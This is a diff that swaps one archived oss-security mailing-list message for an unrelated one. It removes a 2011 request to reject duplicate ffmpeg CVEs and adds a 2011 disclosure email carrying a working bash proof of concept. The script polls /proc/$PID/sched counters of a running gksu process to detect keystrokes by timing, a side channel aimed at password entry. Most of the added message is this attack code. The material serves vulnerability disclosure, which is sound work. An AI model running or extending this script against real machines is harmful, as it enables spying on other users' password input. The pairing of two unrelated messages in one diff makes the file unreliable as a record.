@@ -1,18 +1,71 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/04/3
-Message-ID: <CANTw=MN_j=SPB8GVmWbnTBA6WYY6ASZm0+BMr8JqZ-=mdf=rCw@mail.gmail.com>
-Date: Sun, 4 Sep 2011 13:39:43 -0400
-From: Michael Gilbert <michael.s.gilbert@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: "Steven M. Christey" <coley@...-smtp.mitre.org>
-Subject: Please REJECT CVE-2011-2160 and CVE-2011-2162 in ffmpeg as duplicates (was: ffmpeg issues)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/05/3
+Message-ID: <20111105104736.GA3509@albatros>
+Date: Sat, 5 Nov 2011 14:47:36 +0400
+From: Vasiliy Kulikov <segooon@...il.com>
+To: security@...nel.org
+Cc: oss-security@...ts.openwall.com
+Subject: /proc/$PID/sched PoC: spy-gksu
 Content-Type: text/plain; charset=utf-8
 
-Please REJECT CVE-2011-2160 (duplicate of CVE-2011-1198) and
-CVE-2011-2162 (duplicate of CVE-2011-0723).  See thread at [0] for
-further details.
+#!/bin/bash
+#
+# A PoC for spying for keystrokes in gksu in Linux <= 3.1.
+#
+# /proc/$PID/{sched,schedstat} are world readable, so we can just loop
+# on one CPU core while the victim is executed on another, and spy for
+# the changes of scheduling counters.  The PoC counts only keystrokes number,
+# but it can be easily extended to note the delays between the keystrokes
+# and do the statistical analysis to learn the input characters.  See
+# e.g. "Peeping Tom in the Neighborhood: Keystroke Eavesdropping on
+# Multi-User Systems" by Kehuan Zhang and XiaoFeng Wang.
+#
+# It is NOT stable, it only shows a design flaw (the lack of proper
+# permission model of procfs debugging counters).  The constants are true
+# for the author's system only and don't take into account other sources of
+# gksu CPU activity.
+#
+#   by segoon from openwall
+#
+# run as: spy-sched gksu
 
-Thanks,
-Mike
+PNAME="$1"
 
-[0] http://lists.debian.org/debian-security-tracker/2011/09/msg00006.html
+while :; do
+    PID=`pgrep "$PNAME"`
+    if [ -n "$PID" ]; then
+        echo $PID
+        cd /proc/$PID/
+        break
+    fi
+    sleep 1
+done
+
+S=0.0
+while :; do
+    V=`grep se.exec_start sched 2>/dev/null | cut -d: -f2-`
+    [ -z "$V" ] && break
+    if [ "$V" != "$S" ]; then
+        VAL=`echo "$V - $S" | bc -l`
+        VALI=`echo $VAL | cut -d. -f1`
+        [ -z "$VALI" ] && VALI=0
+
+        if [ "$VALI" -le 815 -a "$VALI" -ge 785 ]; then
+            # Cursor appeared
+            :
+        elif [ $VALI -le 415 -a $VALI -ge 385 ]; then
+            # Cursor disappeared
+            :
+        elif [ $VALI -ge 150 ]; then
+            echo "$VAL (KEY PRESSED)"
+        else
+            echo "$VAL"
+        fi
+
+        S=$V
+    fi
+done
+
+-- 
+Vasiliy Kulikov
+http://www.openwall.com - bringing security into open computing environments
